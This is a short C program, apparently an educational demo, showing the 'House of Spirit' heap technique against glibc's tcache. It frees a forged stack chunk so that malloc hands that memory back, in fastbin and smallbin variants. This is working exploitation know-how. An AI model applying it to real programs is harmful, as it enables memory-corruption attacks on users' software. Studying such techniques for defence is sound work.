#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>

struct malloc_chunk {
	size_t prev_size;
	size_t size;
	union {
		union {
			struct malloc_chunk *fd;
			struct malloc_chunk *bk;
		};
		char buf[100];
	};
};

#define mem2chunk(m) \
	( (struct malloc_chunk*)((char*)m - offsetof(struct malloc_chunk, fd)) )
#define chunk2mem(c) \
	( (void*)((char*)c + offsetof(struct malloc_chunk, fd)) )

#define size2request(sz) (sz - 2*sizeof(size_t))
int main(void)
{
	printf("The House of Spirit with tcache \n"
		   "There's no nextsize check (invalid next size (fast))\n"
		   "[Fastbin]\n");
	struct malloc_chunk evil1 = {.size = 0x100};
	printf(" Evil chunk : %p\n", &evil1);
	void *victim = malloc(0x20);
	// overwrite victim by evil
	victim = chunk2mem(&evil1);
	free(victim);
	printf(" Next allocation : %p\n", mem2chunk(malloc(size2request(evil1.size))));


	printf("Now it works in small chunk too\n"
		   "[Smallbin]\n");
	struct malloc_chunk evil2 = {.size = 0x100};
	printf(" Evil chunk : %p\n", &evil2);
	victim = malloc(0xc0);
	// overwrite victim by evil
	victim = chunk2mem(&evil2);
	free(victim);
	printf(" Next allocation : %p\n", mem2chunk(malloc(size2request(evil2.size))));

	return 0;
}
